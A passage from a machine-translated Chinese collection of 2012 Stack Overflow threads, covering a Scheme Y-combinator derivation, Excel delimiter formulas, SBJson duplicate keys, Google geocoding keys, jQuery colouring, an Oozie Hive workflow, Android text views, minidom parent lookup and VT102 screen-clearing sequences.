最后，我们注意到`(lambda (f) (lambda (lst ...))`表达式 in`C.`不依赖于任何`h`and `g`。所以我们可以把它拿出来，让它成为一个论点，然后剩下...... **Y**组合子：

```
( ( (lambda (rec)            ; D.
      ( (lambda (h) (h h))  
        (lambda (g)
          (rec  (lambda (x) ((g g) x))))))   ; applicative-order Y combinator
    (lambda (f)
        (lambda (lst) 
          (if (null? lst) 0
            (add1 (f (cdr lst)))))) )
  (list 1 2 3) )                            ; ==> 3 
```

所以现在，在函数上调用**Y**等同于从中进行递归定义：

```
( y (lambda (f) (lambda (x) .... (f x) .... )) ) 
===  define f = (lambda (x) .... (f x) .... ) 
```

...但是使用`letrec`（或命名为 let）*更好*——更有效，[在自引用环境框架中定义闭包](https://stackoverflow.com/questions/7719004/in-scheme-how-do-you-use-lambda-to-create-a-recursive-function/11833038#11833038)。整个**Y**事物是对不可能实现的系统的理论练习——即在不可能*命名*事物的情况下，创建名称*“指向”*事物的*绑定，**指代*事物。

 ***顺便说一句，*指向*事物的能力是高等灵长类动物与动物界其他生物的区别 ⁄ 生物，至少我听说。*:)

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2012-05-08T14:13:53.597

要查看会发生什么，请使用 DrRacket 中的步进器。步进器允许您查看所有中间步骤（并来回走动）。

将以下内容粘贴到 DrRacket：

```
(((lambda (mk-length)
    (mk-length mk-length))
  (lambda (mk-length)
    (lambda (l)
      (cond
        ((null? l) 0 )
        (else (add1
               ((mk-length mk-length)
                (cdr l))))))))
 '(a b c)) 
```

然后选择教学语言“Intermediate Student with lambda”。然后单击步进按钮（绿色三角形后跟一个条形）。

这是第一步的样子：

![在此处输入图像描述](../Images/ebbbb478d6fe79a27679112f43f349fa.png)

然后为第二个函数做一个例子，看看哪里出了问题。*******

# excel - Excel中与分隔符公式连接的问题

> ID：10499517
> 
> 赞同：1
> 
> 时间：2012-05-08T13:24:02.607
> 
> 标签：excel, excel-2007, excel-formula, vba

我正在尝试用分号分隔符连接其他每一列中的单元格。我拥有并且基本上有效的公式是：

```
=IF(SUBSTITUTE(TRIM(H2&" "&J2&" "&L2&" "&N2&" "&P2&" "&R2&" "&T2&" "&V2&" "&X2&" "&Z2)," ","; ")="","",SUBSTITUTE(TRIM(H2&" "&J2&" "&L2&" "&N2&" "&P2&" "&R2&" "&T2&" "&V2&" "&X2&" "&Z2)," ","; ")) 
```

但是我遇到的问题是一些单元格包含带空格的文本，并且公式将分隔符放在合法空格的位置。我该如何纠正？

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:50:52.763

您正在调用`SUBSTITUTE`的空格字符不仅是您的临时分隔符，而且还是连接字符串中的模式。

肮脏而快速的解决方案是使用不会出现在`H2, L2, N2...`单元格中的临时分隔符模式。在这里，我选择了，`###`但任何其他模式都可以解决问题。

```
=IF(SUBSTITUTE(TRIM(H2&"###"&J2&"###"&L2&"###"&N2&"###"&P2&"###"&R2&"###"&T2&"###"&V2&"###"&X2&"###"&Z2),"###","; ")="","",SUBSTITUTE(TRIM(H2&"###"&J2&"###"&L2&"###"&N2&"###"&P2&"###"&R2&"###"&T2&"###"&V2&"###"&X2&"###"&Z2),"###","; ")) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T19:51:19.757

这行得通吗？

`=IF(COUNTA(H2,J2,L2,N2,P2,R2,T2,V2,X2,Z2),H2&";"&J2&";"&L2&";"&N2&";"&P2&";"&R2&";"&T2&";"&V2&";"&X2&";"&Z2,"")`

或者当你有空格时只显示一次分隔符也许试试这个版本

`=SUBSTITUTE(IF(H2="","",";"&H2)&IF(J2="","",";"&J2)&IF(L2="","",";"&L2)&IF(N2="","",";"&N2)&IF(P2="","",";"&P2)&IF(R2="","",";"&R2)&IF(T2="","",";"&T2)&IF(V2="","",";"&V2)&IF(X2="","",";"&X2)&IF(Z2="","",";"&Z2),";","",1)`

# .htaccess - CodeIgniter 的 .htaccess

> ID：10499520
> 
> 赞同：0
> 
> 时间：2012-05-08T13:24:14.883
> 
> 标签：.htaccess

我的 CodeIgniter 结构：
public/
application/
system/

我不希望任何人访问[http://exampble.com/public](http://exampble.com/public)，只允许应用程序访问资源。我尝试在内容为“全部拒绝”的目录中创建文件 .htaccess，因此用户无法访问此目录。但我的应用程序也无法访问。

我怎么解决这个问题？

请给我任何想法。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:48:02.757

从它的名字看，您似乎正在使用“公共”目录来存储您网站的相关图像和 css。

如果是这种情况，那么您无法阻止用户访问它，除非您不想为您的网站提供图像或显示样式。

但是，您可以启用所谓的热链接保护，它将检查每个请求的引用者（不是很安全，但认为它可能会帮助您）。

# iphone - 为什么 SBJson JSON 解析只得到最后一个感兴趣的键？

> ID：10499522
> 
> 赞同：1
> 
> 时间：2012-05-08T13:24:16.617
> 
> 标签：iphone, objective-c, ios, json, sbjson

我正在使用以下 JSON：[http](http://www.kb.dk/tekst/mobil/aabningstider_en.json) ://www.kb.dk/tekst/mobil/aabningstider_en.json 当我尝试通过键“位置”解析它时：

```
//    get response in the form of a utf-8 encoded json string
NSString *jsonString = [[[NSString alloc] initWithData:responseData encoding:NSUTF8StringEncoding] stringByTrimmingCharactersInSet:[NSCharacterSet newlineCharacterSet]];

//    get most parent node from json string
NSDictionary *json = [jsonString JSONValue];

//    get key-path from jason up to the point of json object
NSDictionary *locations = [json objectForKey:@"location"];

NSLog( @"%@", locations );

//    iterate through all of the location objects in the json
for (NSDictionary *loc in locations )
{

    //        pull library name from the json object
    NSString *name = [loc valueForKey:@"name"];
    //        add library data table arrays respectively
    [ libraryNames addObject: ( ( name == nil | name.length > 0 ) ? name : @"UnNamed" ) ];

} 
```

当我通过 NSLog 打印对象位置时：

```
{
address = "Universitetsparken 4, 3\. etage, 2100 K\U00f8benhavn \U00d8";
desc = "";
lastUpdated = "";
latlng = "55.703124,12.559596";
link = "http://www.farma.ku.dk/index.php?id=3742";
name = "Faculty of Pharmaceutical Sciences Library";
parts =     {
    part =         {
        hour =             {
            day = "5.June Constitution Day (Denmark)";
            open = Closed;
        };
        hours =             {
            hour =                 {
                day = Friday;
                open = "10-16";
            };
        };
        name = main;
    };
};
} 
```

这只是“位置”键的最后一个值。难道我做错了什么？我尝试通过[http://jsonlint.com/](http://jsonlint.com/)验证 JSON ，但是当我输入上面的 JSON URL 时，它说“有效” - 仍然只显示最后一个“位置”键”，但是如果我复制-粘贴它，它不会验证 JSON，并且必须通过从字符串中删除换行来修复。

此外，当我尝试解析 JSON 并获取“名称”字段时，出现以下异常：

```
2012-05-08 15:37:04.941 iPhone App Tabbed[563:f803] *** Terminating app due to uncaught         exception 'NSUnknownKeyException', reason: '[<__NSCFString 0x68bfe70> valueForUndefinedKey:]:     this class is not key value coding-compliant for the key name.'
*** First throw call stack:
(0x13dc052 0x156dd0a 0x13dbf11 0x9d2f0e 0x941841 0x940ca9 0x4593 0xf964e 0x114b89 0x1149bd     0x112f8a 0x112e2f 0x1148f4 0x13ddec9 0x365c2 0x3655a 0x25b569 0x13ddec9 0x365c2 0x3655a     0xdbb76 0xdc03f 0xdbbab 0x25dd1f 0x13ddec9 0x365c2 0x3655a 0xdbb76 0xdc03f 0xdb2fe 0x5ba30     0x5bc56 0x42384 0x35aa9 0x12c6fa9 0x13b01c5 0x1315022 0x131390a 0x1312db4 0x1312ccb 0x12c5879     0x12c593e 0x33a9b 0x281d 0x2785)
terminate called throwing an exception(lldb) 
```

如果“位置”标签是一个用方括号 ([]) 括起来的数组对象，那会更有意义，但是现在它只是一系列普通的键值对......遗憾的是，这是我必须使用的 JSON .

请帮助并非常感谢！:)

真诚的，彼得。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-10T22:36:23.070

您必须使用的 JSON 可能是有效的，但它没有多大意义。它有一本大字典，其中的`location`键重复了很多次。大多数 JSON 解析器将简单地返回重复键的最后一个值。如果您可以更改结构以使用数组代替，那将是最好的，但如果您不能，仍然有希望。您可以读取流并将`location`键中的值从其中出来时填充到数组中。这就是你这样做的方式：

```
@interface BadJsonHelper : NSObject
@property(strong) NSMutableArray *accumulator;
@end    
@implementation BadJsonHelper
- (void)parser:(SBJsonStreamParser *)parser foundArray:(NSArray *)array {
    // void
}
- (void)parser:(SBJsonStreamParser *)parser foundObject:(NSDictionary *)dict {
    [accumulator addObject:dict];
}
@end 
```

您可以将那个小助手类放在文件顶部，在您正在工作的类的@implementation 部分之外。（@interface 和 @implementation 不需要在不同的文件中。）

在您的代码中，您可以像这样使用它：

```
BadJsonHelper *helper = [[BadJsonHelper alloc] init];
helper.accumulator = [NSMutableArray array];

SBJsonStreamParserAdapter *adapter = [[SBJsonStreamParserAdapter new] init];
adapter.delegate = helper;
adapter.levelsToSkip = 1;

SBJsonStreamParser *parser = [[SBJsonStreamParser alloc] init];
parser.delegate = adapter;

switch ([parser parse: responseData]) {
    case SBJsonStreamParserComplete: 
        NSLog(@"%@", helper.accumulator);
        break;
    case SBJsonStreamParserWaitingForData:
        NSLog(@"Didn't get all the JSON yet...");
        break;
    case SBJsonStreamParserError:
        NSLog(@"Error: %@", parser.error);
        break;
} 
```

此示例最初改编自以下测试： [https ://github.com/stig/json-framework/blob/master/Tests/StreamParserIntegrationTest.m](https://github.com/stig/json-framework/blob/master/Tests/StreamParserIntegrationTest.m)

**更新：**我创建了一个功能齐全的示例项目，它异步加载 JSON 并解析它。这可以从[github](https://github.com/stig/stackoverflow-answer-10499522)获得。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T14:03:27.843

JSON 是有效的，但是关于项目数组的定义存在一个基本问题。

`locations`JSON 不是定义使用括号的数组，而是`location`一遍又一遍地重新定义相同的键/值对。换句话说，JSON 最初说 location 的值是名为“The Black Diamond”的集合，但在它立即用名为“Faculty Library of Humanities”的集合重新定义它，依此类推，直到最后一个位置 Faculty of Pharmaceutical Sciences Library ”。

`parts`和也是如此`hours`。

如果您无法修复 JSON 的结果并且您确实需要使其正常工作，您可能需要修改 JSON 删除“位置”键并正确添加括号。

**编辑**

或者，您可以使用`NSScanner`并手动处理 JSON 结果。有点骇人听闻，但只要 JSON 格式没有显着变化，它就可以工作。

**编辑**

这段代码应该可以完成工作......

```
NSString *jsonString = [[[NSString alloc] initWithData:responseData encoding:NSUTF8StringEncoding] stringByTrimmingCharactersInSet:[NSCharacterSet newlineCharacterSet]];

int indx = 1;
for (;;)
{
    NSRange locationRange = [jsonString rangeOfString:@"\"location\":"];

    if (locationRange.location == NSNotFound) break;

    jsonString = [jsonString stringByReplacingCharactersInRange:locationRange
                                                     withString:[NSString stringWithFormat:@"\"location%d\":", indx++]];
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T14:09:06.483

```
NSDictionary *locations = [json objectForKey:@"location"]; 
```

可以看到，SBJson 解析 JSON 的结果是一个`NSDictionary`. 字典包含键/值对，键是对的**唯一**标识符。

您需要处理的 JSON 数据是有效的，但不是一个好的数据。根据[RFC 4627 - 2.2](http://www.ietf.org/rfc/rfc4627.txt?number=4627)：

> 对象结构表示为一对围绕零个或多个名称/值对（或成员）的花括号。名称是一个字符串。每个名称后面都有一个冒号，将名称与值分开。单个逗号将值与后面的名称分开。 **对象中的名称应该是唯一的。**

jQuery之类的东西也可以解析JSON，但结果与SBJson相同（最后一个为一个）。请参阅[JSON 键是否需要唯一？](https://stackoverflow.com/q/5306741/1241690).

这不是必须的，但仍然不是一个好习惯。如果您能够在服务器端（甚至在接收到它之后在客户端）更改 JSON 数据的结构，而不是按原样解析它，那将会容易得多。

# php - 使用身份验证时 Google 地图地理编码 API 不起作用

> ID：10499524
> 
> 赞同：2
> 
> 时间：2012-05-08T13:24:26.850
> 
> 标签：php, google-maps, google-maps-api-3, google-api

我设置了一个小的 PHP 脚本，通过 CURL 使用谷歌的地理编码 API 验证用户提交的地址信息。

```
https://developers.google.com/maps/documentation/geocoding/#GeocodingRequests 
```

使用您每天每个 IP 获得的正常配额，一切正常。但是，每当我尝试使用我的 API 密钥进行身份验证时，我都会收到 REQUEST_DENIED 响应。

成功响应

```
http://maps.googleapis.com/maps/api/geocode/json?sensor=false&address=Agadir 
```

请求被拒绝

```
http://maps.googleapis.com/maps/api/geocode/json?sensor=false&address=Agadir&key={my_api_key} 
```

我已经设置了我的项目以允许访问该服务（Google Maps API v3），而且我肯定离每日配额还很远。我也 100% 确定我的 API 密钥是正确的。

有谁知道 API 密钥是否需要一些时间来传播？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T15:36:54.177

您需要`base64_decode()`API 密钥，然后对 URL 进行签名。[来自 Google 的工作代码](http://gmaps-samples.googlecode.com/svn/trunk/urlsigning/UrlSigner.php-source)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:26:58.640

看起来地理编码请求不需要密钥。我刚刚在浏览器中打开了这个链接：[http](http://maps.googleapis.com/maps/api/geocode/json?sensor=false&address=Agadir) ://maps.googleapis.com/maps/api/geocode/json?sensor=false&address= Agadir 并获得了有效的 JSON。未指定密钥。您应该尝试使用任何免费的 CGI 代理或另一台机器，并首先尝试使用您的浏览器访问此 URL。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-27T10:17:05.520

在您的请求被拒绝时尝试使用 https 而不是 http，因为 Google Api 需要通过 SSL 的请求。

# javascript - 如何使用 JavaScript 更改字符串字体颜色

> ID：10499525
> 
> 赞同：1
> 
> 时间：2012-05-08T13:24:29.857
> 
> 标签：javascript, jquery, asp.net-mvc-3

编辑：我正在为我的公司创建一个仪表板，显示我们所有的最新项目。我是应用程序开发团队的实习生。仪表板显示项目名称及其最新版本，以及这些版本的状态。

我正在使用在 SUCCESS、FAILURE、ERROR 和 UNKNOWN 之间变化的动态字符串。这些字符串使用 td class="status" 在 HTML 中显示。状态可以根据项目构建是失败还是成功而改变。SUCCESS 应该是绿色的，FAILURE 应该是红色的，所有其他的应该是黑色的。我有一个创建表的 for 循环。

我正在尝试使用 switch 语句根据字符串的内容使用 javascript 的函数 .fontcolor() 更改字体颜色。字符串正在从 status.status 中提取

目前一切都在屏幕上正确显示，但字体颜色实际上并没有改变。我也没有收到任何错误。

```
for (var i in buildstatuses) {
                var status = buildstatuses[i];

                switch (status.status) {
                    case "SUCCESS":
                        status.status.fontcolor("green")
                        break;
                    case "FAILURE":
                        status.status.fontcolor("red")
                        break;
                    default:
                        status.status.fontcolor("black")
                        break;
                }

                $("tr#" + status.id + " td.status").html(status.status)

                if (status.status != "SUCCESS") {

                    var row = $("tr#" + status.id)

                           row.parent().parent().parent().parent().parent().removeClass("dashboard-success").addClass("dashboard-fail");

                    row.parent().parent().prepend(row.clone());  // Places Failure at the top by cloning then removing
                    row.remove();

                }
                $("tr#" + status.id + " td.date").html(status.date)
                console.log(status.id);
            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:30:49.887

我想你只是想改变css颜色内联：

```
var statusColor = 'black';
switch (status.status) {
  case "SUCCESS":
    statusColor = "green";
    break;
  case "FAILURE":
    statusColor = "red";
    break;
  default:
    statusColor = "black";
    break;
 }

 $("tr#" + status.id + " td.status").html(status.status).css('color', statusColor); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:32:12.743

我将把它移到一个小函数中

```
function ChangeColor(result)
{
    var item=$(".status");
    if(result=="SUCCESS")
        item.css("color","green");
    if(result=="FAILURE")
        item.css("color","red");    
} 
```

你可以这样称呼它

```
ChangeColor("FAILURE"); 
```

或者

```
ChangeColor("SUCCESS"); 
```

所以在你的代码中，

```
for (var i in buildstatuses) {
    var status = buildstatuses[i];
    ChangeColor(status.status);

   //your remaining code to do whatver you want after changing the color
} 
```

示例：http: [//jsfiddle.net/gVV3U/3/](http://jsfiddle.net/gVV3U/3/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:27:01.090

您没有在 HTML 中使用颜色..

改变

```
$("tr#" + status.id + " td.status").html(status.status) 
```

至

```
$("tr#" + status.id + " td.status")
        .html(status.status) // set text
        .css({color: status.status.fontcolor}); // set color 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:29:48.390

你可以使用 JavaScript`style`函数来做到这一点：EX：

`document.getElementById('yourId').style.color = 'red';`

或使用 jquery：

```
 $('#yourid').css('color','red'); 
```

# hadoop - 配置单元查询的简单 oozie 示例？

> ID：10499526
> 
> 赞同：9
> 
> 时间：2012-05-08T13:24:34.523
> 
> 标签：hadoop, hive

我正在尝试将一个简单的工作流程转换为 oozie。我试过浏览 oozie 的例子，但它们有点让人不知所措。实际上，我想运行查询并将结果输出到文本文件。

```
hive -e 'select * from tables' > output.txt 
```

我如何将它翻译成 oozie 让它每小时运行一次？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-09T05:15:26.380

您的工作流程可能看起来像这样......
`workflow.xml`

```
<workflow-app xmlns="uri:oozie:workflow:0.2" name="hive-wf">
    <start to="hive-node"/>
    <action name="hive-node">
        <hive xmlns="uri:oozie:hive-action:0.2">
           <job-tracker>localhost:50001</job-tracker>
            <name-node>hdfs://localhost:50000</name-node>
            <configuration>
                <property>
                    <name>mapred.job.queue.name</name>
                    <value>default</value>
                </property>
                <property>
                    <name>oozie.hive.defaults</name>
                    <value>/user/user1/oozie/hive-site.xml</value>
                </property>
            </configuration>
            <script>script.q</script>
            <param>INPUT_TABLE=SampleTable</param>
            <param>OUTPUT=/user/user1/output-data/hive</param>
        </hive>
        <ok to="end"/>
        <error to="fail"/>
    </action>
    <kill name="fail">
        <message>Hive failed, error message[${wf:errorMessage(wf:lastErrorNode())}]</message>
    </kill>
    <end name="end"/>
</workflow-app> 
```

所以这里的 hive-site.xml 是**$HIVE_HOME/conf**文件夹中的站点 xml。
script.q 文件包含实际的配置单元查询。`select * from ${INPUT_TABLE}`.

* * *

我们如何以及在哪里使用 OUTPUT 参数？

# android - 单击 android 编辑框时显示最近输入文本的下拉列表

> ID：10499530
> 
> 赞同：4
> 
> 时间：2012-05-08T13:24:55.783
> 
> 标签：android, android-edittext

当用户编辑文本时，我必须显示最近输入的文本的下拉列表。示例是登录页面显示以前登录的用户

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:46:05.353

您正在寻找 AutoCompleteTextView [http://developer.android.com/reference/android/widget/AutoCompleteTextView.html](http://developer.android.com/reference/android/widget/AutoCompleteTextView.html)

**创建登录列表**

当用户登录时，您需要将该登录信息保存到某种持久性存储（数据库、文本文件）中。

**创建自动完成列表**

每次使用 EditText 登录创建表单时

1.  从数据库中提取以前的登录值
2.  从之前的登录值中创建一个字符串数组
3.  从 String 数组中创建一个数组适配器
4.  将数组适配器附加到您的 AutoCompleteTextView。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-12T17:29:12.233

我只是在找不到解决方案后才实现了这一点。我做了 Gopher 所说的，但将其存储为私人偏好而不是文件。我还添加了一个 if 语句来阻止该项目两次出现在列表中。

```
public void YOURSUBMITBUTTON(View view) 
{
    PrevItemsAutoComplete customitemname = (PrevItemsAutoComplete) findViewById(R.id.YOURTEXTVIEW);

    SharedPreferences.Editor editor = getPreferences(MODE_PRIVATE).edit();
    editor.putString("customitemname",customitemname.getText().toString());
    editor.commit();

    customitemname.setAdapter(new ArrayAdapter<String>(this, android.R.layout.simple_dropdown_item_1line, updatedropdown(5)));
}

public String[] updatedropdown(int listlength)
{
    boolean itemalreadyinlist=false;
    SharedPreferences.Editor editor = getPreferences(MODE_PRIVATE).edit();

    for(int i = 0; i<listlength; i++)
    {
        if (getPreferences(MODE_PRIVATE).getString("customitemname","").equals(getPreferences(MODE_PRIVATE).getString("recentlistitem"+String.valueOf(i),"")))
        {
            itemalreadyinlist=true;
            for(int j = i; j>0; j--)
            {
                editor.putString("recentlistitem"+String.valueOf(j),getPreferences(MODE_PRIVATE).getString("recentlistitem"+String.valueOf(j-1),""));
            }
            editor.putString("recentlistitem0",getPreferences(MODE_PRIVATE).getString("customitemname",""));
            editor.commit();
            break;
        }
    }

    if( !itemalreadyinlist)
    {
        for(int i = listlength-1; i>0; i--)
        {
            editor.putString("recentlistitem"+String.valueOf(i),getPreferences(MODE_PRIVATE).getString("recentlistitem"+String.valueOf(i-1),""));
        }
        editor.putString("recentlistitem0",getPreferences(MODE_PRIVATE).getString("customitemname",""));
        editor.commit();
    }

    String[] recentlist = new String[listlength];
    for(int i=0;i<listlength;i++)
    {
        recentlist[i] = getPreferences(MODE_PRIVATE).getString("recentlistitem"+String.valueOf(i),"");
    }

    return recentlist;
} 
```

其中 customitemname 是包含输入的文本视图。单击按钮时会调用上述代码。

如果你想知道 PrevItemsAutoComplete 是什么，它是一个扩展 AutoCompleteTextView 的自定义类。虽然它适用于后者，但我更喜欢前者。这是课程：

```
import android.content.Context;  
import android.graphics.Rect;
import android.util.AttributeSet;
import android.widget.AutoCompleteTextView;

public class PrevItemsAutoComplete extends AutoCompleteTextView {

public PrevItemsAutoComplete(Context context) {
    super(context);
}

public PrevItemsAutoComplete(Context arg0, AttributeSet arg1) {
    super(arg0, arg1);
}

public PrevItemsAutoComplete(Context arg0, AttributeSet arg1, int arg2) {
    super(arg0, arg1, arg2);
}

@Override
public boolean enoughToFilter() {
    return true;
}

@Override
protected void onFocusChanged(boolean focused, int direction, Rect previouslyFocusedRect) {
    super.onFocusChanged(focused, direction, previouslyFocusedRect);
    if (focused){
        setText("");
        performFiltering("", 0);
        showDropDown();
    }
}

} 
```

PrevItemsAutoComplete 是从此处的原始版本修改而来的：[https](https://stackoverflow.com/a/5783983/2066079) ://stackoverflow.com/a/5783983/2066079 。

如果您选择使用此类，请记住在 xml 中使用`<your.namespace.PrevItemsAutoComplete ... />`而不是。`<AutoCompleteTextView ... />`

此外，您可能必须添加`customitemname.addTextChangedListener(this);`到您的 onCreate。

* * *

我花了很多时间在这上面，所以如果这对你有帮助，请不要忘记点赞。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:40:43.043

使用[自动完成文本视图](http://developer.android.com/reference/android/widget/AutoCompleteTextView.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:42:36.997

您可以使用[AutoComplete TextView](http://developer.android.com/resources/tutorials/views/hello-autocomplete.html)。但是您需要进行更改，就像您必须维护以前登录用户的 ArrayList 一样。

# python - xml python解析获取父节点名称：minidom

> ID：10499534
> 
> 赞同：0
> 
> 时间：2012-05-08T13:25:06.970
> 
> 标签：python, xml

我怎么知道父节点的名称说我在标签 =“衬衫”，我怎么知道它的父节点是 john_carter，其父节点是“FG”。有没有可能知道（在minidom中）

-90 。. .

```
 <Object type="Layer" id="6" label="FG" expanded="True">
            <Properties>
                <Property id="blur" constant="True">
                    <Value>0</Value>
                </Property>
                .
                .
                .

                <Property id="objects" expanded="True" constant="True">
                    <Object type="Layer" id="7" label="john_carter">
                        <Properties>
                            <Property id="blur" constant="True">
                                <Value>0</Value>
                            </Property>
                            .
                            .
                            .

                            <Property id="objects" expanded="True" constant="True">
                                <Object type="Layer" id="8" label="shirt" selected="True">
                                    <Properties>
                                        <Property id="blur" constant="True">
                                            <Value>0</Value>
                                        </Property>
                                        .
                                        .
                                        .
                            .
                            .
                            .
                .
                .
                .

    .
    .
    . 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T15:18:10.903

也许像这样？

```
import xml.dom.minidom

def getParentObjectNode(node):
    while node.parentNode:
        node = node.parentNode
        if node.nodeName == "Object":
            return node

xml = xml.dom.minidom.parse("C:\\myxml.xml")
for shirtNode in xml.getElementsByTagName("Object"):
    if shirtNode.getAttribute("label") == "shirt":
        break

shirtParentObject = getParentObjectNode(shirtNode)
print(shirtParentObject.getAttribute("label"))
shirtParentParentObject = getParentObjectNode(shirtParentObject)
print(shirtParentParentObject.getAttribute("label")) 
```

# android - 文本视图中显示的最后一个单词

> ID：10499535
> 
> 赞同：8
> 
> 时间：2012-05-08T13:25:15.273
> 
> 标签：android, textview

我将在一个 android 应用程序的几个页面上显示一个完整的文本文档。每个页面都包含一个 TextView 控件，该控件负责显示文本。它还包含一个下一步按钮，该按钮负责更新 textview 并从最后显示的部分结束的地方跟随文本。
问题是如何在 TextView 的可显示区域中找到最后显示的单词？
注意：在这个应用程序中， textView**不**应该滚动或使用 ellipsize。还必须注意 textsize 可以增加或减少。为了更好地了解情况：要显示的示例文本：

> 这是全文。在第一页它刚刚结束，必须从这里开始**。**

这是其显示的示例插图。问题是如何找到“这里”作为第 1 页中显示的最后一个单词？ ![这是其显示的示例插图。 问题是如何找到单词](../Images/8043bfd664e78bec2a201b22331de0a7.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-12T13:18:06.563

最后我开发了一段代码，可以找到最后显示的单词。考虑到我们将使用属性**width**和**height**作为其大小以及dp 中的**textSize**作为文本大小的文本视图，函数 formatStringToFitInTextView 计算文本视图中最后显示的单词并将其作为函数输出返回。在下面的示例中，我们将 SERIF 字体视为 TextView 字体。

```
String formatStringToFitInTextView(int width, int heigth, String inputText,float textSize) {
    String[] words;
    String lastWord = "";
    String finalString="";
    StaticLayout stLayout;
    int i,numberOfWords;
    int h;
    Typeface tf = Typeface.SERIF;
    TextPaint tp = new TextPaint();
    tp.setTypeface(tf );
    tp.setTextSize(textSize);   //COMPLEX_UNIT_DP

    words = inputText.split(" ");   //split input text to words
    numberOfWords = words.length;
    for (i=0;i<numberOfWords;i++){ 
        stLayout= measure(tp,finalString+words[i]+" ",width);
        h=stLayout.getHeight(); 
        if (stLayout.getHeight() > heigth) break;
        finalString += words[i]+" ";
        lastWord  = words[i];
    }

    return lastWord;
}
StaticLayout measure( TextPaint textPaint, String text, Integer wrapWidth ) {
    int boundedWidth = Integer.MAX_VALUE;
    if( wrapWidth != null && wrapWidth > 0 ) {
      boundedWidth = wrapWidth;
    }
    StaticLayout layout = new StaticLayout( text, textPaint, boundedWidth, Alignment.ALIGN_NORMAL, 1.0f, 0.0f, false );
    return layout;
} 
```

执行操作的总逻辑是将输入文本拆分为单词并将单词逐个添加到 textview 直到它填满提供的高度和宽度，然后将最后添加的单词作为最后显示的单词返回。

注意：感谢[Moritz](https://stackoverflow.com/users/271877/moritz)，我使用了[此答案](https://stackoverflow.com/a/8122301/1080355)中的函数测量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T22:08:04.040

我现在不能尝试这个想法，但让我们试一试吧！根据[这篇文章](https://stackoverflow.com/questions/5970640/how-to-find-android-textview-number-of-characters-per-line)，您可以使用以下方法来确定字符串是否适合文本视图。

```
private boolean isTooLarge (TextView text, String newText) {
    float textWidth = text.getPaint().measureText(newText);
    return (textWidth >= text.getMeasuredWidth ());
} 
```

所以一个想法，如果文本总是相同的，您可以手动定义每个文本视图的初始值，然后当您增加或减少字体时重新计算它，删除或添加单词。

如果不能手动输入初始值，您可以执行以下操作：

```
String wordsInTextview = new String();
int lastUsedWord= 0;
int totalNumberOfWords = text.size();
  for (int i=lastUsedWord;i<totalNumberOfWords;i++) {             
         if !(isTooLarge(TextView,wordsInTextview)) { 
            wordsInTextview = wordsInTextview + text(i); // add the words to be shown
         } else { 
         TextView.setText(wordsInTextView);
         lastUsedWord= i;
         wordsInTextView = new String(); // no idea if this will erase the textView but shouldn't be hard to fix     
         }      
    } 
```

您还需要存储 textView 的第一个单词的位置，因此当您调整文本大小时，您知道从哪里开始！

```
int firstWordOnTextView = TextView.getText().toString().split(" ")[0] 
```

当它调整大小时，您可以使用相同的方法来计算屏幕上的文本。

```
lastUsedWord = firstWordOnTextView; 
```

如果您想更快，您可以跟踪每页上有多少单词，进行平均，然后在运行几次后始终从那里统计您的循环。或之前的几句话，以避免不得不重复回来。

如果您不必一次显示太多页面，我相信这是一个合理的解决方案！

对不起，代码中的错误我现在没有地方可以尝试！对此解决方案有何评论？非常有趣的问题！

# linux - xterm/vt102 序列填充终端窗口，然后在按键时退出，清除屏幕上的任何内容？

> ID：10499536
> 
> 赞同：2
> 
> 时间：2012-05-08T13:25:16.630
> 
> 标签：linux, terminal, xterm, vt100

我试图围绕 VT102 序列以及诸如 ncurses 之类的库如何工作。

举个例子，当我打开 Emacs 时，它会填满终端窗口。当我点击`C-x` `C-c`时，程序退出并且我的终端窗口看起来与我启动 emacs 之前完全一样（即光标上方的行显示了`emacs`我的 zsh 历史记录中的命令，而不是任何 emacs 呈现的命令）。

作为一种“hello world”，我编写了一个打开的小红宝石脚本`/dev/tty`，然后为终端中的行数写入`\x1B[48;597m\n`（空白行，带有背景色）。然后程序休眠 5 秒钟，让我高兴地盯着一个明亮的橙色屏幕片刻。然后它退出，在我的 zsh 提示符下留下我，上面有 53 行亮橙色。

两个问题：

1.  用背景颜色写空行是用颜色填充终端窗口的正确方法吗？
2.  如何通过向 /dev/tty 发送一些 VT102 序列来完全清除屏幕？

我可以发送`\x1B[2J`，但这与执行命令时的作用相同`clear`，实际上只是将所有内容移到终端窗口上，直到我的光标位于空白窗口的最顶部，而不是将光标留在任何地方如果我的程序没有在屏幕上写入大量空白行，那自然会是这样。

PS：不确定在这里使用什么标签，任何人实际上都可能订阅。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T18:00:46.497

> 用背景颜色写空行是用颜色填充终端窗口的正确方法吗？

否。执行此操作的正确方法（在支持 BCE* 的终端上）是设置背景颜色，然后使用 ED 序列（例如，`^[ [ 2 J`）擦除屏幕。

*：大多数现代终端都可以

> 如何通过向 /dev/tty 发送一些 VT102 序列来完全清除屏幕？

使用 ED。看上面。

